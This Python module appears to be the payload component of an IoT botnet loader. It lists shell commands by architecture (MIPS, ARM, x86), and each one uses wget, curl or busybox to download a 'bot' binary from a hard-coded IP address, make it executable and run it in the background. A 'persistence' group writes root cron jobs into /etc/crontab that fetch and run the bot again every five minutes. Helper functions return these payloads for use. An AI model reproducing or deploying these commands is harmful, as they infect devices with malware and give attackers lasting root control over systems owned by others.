#!/usr/bin/env python3
# -*- coding: utf-8 -*-

PAYLOADS = {
    'mips': [
        "wget -q http://85.11.167.41:8080/bot.mips -O /tmp/bot; chmod 777 /tmp/bot; /tmp/bot &",
        "curl -s http://85.11.167.41:8080/bot.mips -o /tmp/bot; chmod 777 /tmp/bot; /tmp/bot &",
        "busybox wget -q http://85.11.167.41:8080/bot.mips -O /tmp/bot; chmod 777 /tmp/bot; /tmp/bot &"
    ],
    'arm': [
        "wget -q http://85.11.167.41:8080/bot.arm -O /tmp/bot; chmod 777 /tmp/bot; /tmp/bot &",
        "curl -s http://85.11.167.41:8080/bot.arm -o /tmp/bot; chmod 777 /tmp/bot; /tmp/bot &"
    ],
    'x86': [
        "wget -q http://85.11.167.41:8080/bot.x86 -O /tmp/bot; chmod 777 /tmp/bot; /tmp/bot &",
        "curl -s http://85.11.167.41:8080/bot.x86 -o /tmp/bot; chmod 777 /tmp/bot; /tmp/bot &"
    ],
    'all': [
        "wget -q http://85.11.167.41:8080/bot.mips -O /tmp/bot.mips; chmod 777 /tmp/bot.mips; /tmp/bot.mips &",
        "wget -q http://85.11.167.41:8080/bot.arm -O /tmp/bot.arm; chmod 777 /tmp/bot.arm; /tmp/bot.arm &",
        "wget -q http://85.11.167.41:8080/bot.x86 -O /tmp/bot.x86; chmod 777 /tmp/bot.x86; /tmp/bot.x86 &"
    ],
    'persistence': [
        "echo -e '*/5 * * * * root wget -q http://85.11.167.41:8080/bot.mips -O /tmp/bot && chmod 777 /tmp/bot && /tmp/bot' >> /etc/crontab",
        "echo -e '*/5 * * * * root wget -q http://85.11.167.41:8080/bot.arm -O /tmp/bot && chmod 777 /tmp/bot && /tmp/bot' >> /etc/crontab"
    ]
}

def get_payload(arch='all'):
    if arch in PAYLOADS:
        return PAYLOADS[arch]
    return PAYLOADS['all']

def get_all_payloads():
    all_payloads = []
    for arch, payloads in PAYLOADS.items():
        all_payloads.extend(payloads)
    return list(set(all_payloads))